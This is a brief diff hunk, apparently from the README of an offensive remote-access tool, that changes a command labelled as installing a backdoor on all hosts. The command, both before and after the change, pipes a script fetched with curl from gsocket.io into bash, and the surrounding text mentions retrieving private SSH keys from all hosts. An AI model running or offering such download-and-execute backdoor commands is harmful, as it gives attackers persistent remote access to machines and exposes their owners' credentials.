@@ -93,7 +93,7 @@ Retrieve the private SSH key (`id_rsa`) from _all_ hosts:
 Install a [backdoor](https://www.gsocket.io/deploy) on _all_ hosts:
 
 ```shell
-~/.config/prng/thc_cli -r exec 'bash -c "$(curl -fsSL https://gsocket.io/x)"'
+~/.config/prng/thc_cli -r exec 'bash -c "$(curl -fsSL https://gsocket.io/y)"'
 ```
 
 ### Offline Installs or when HTTPS is not available
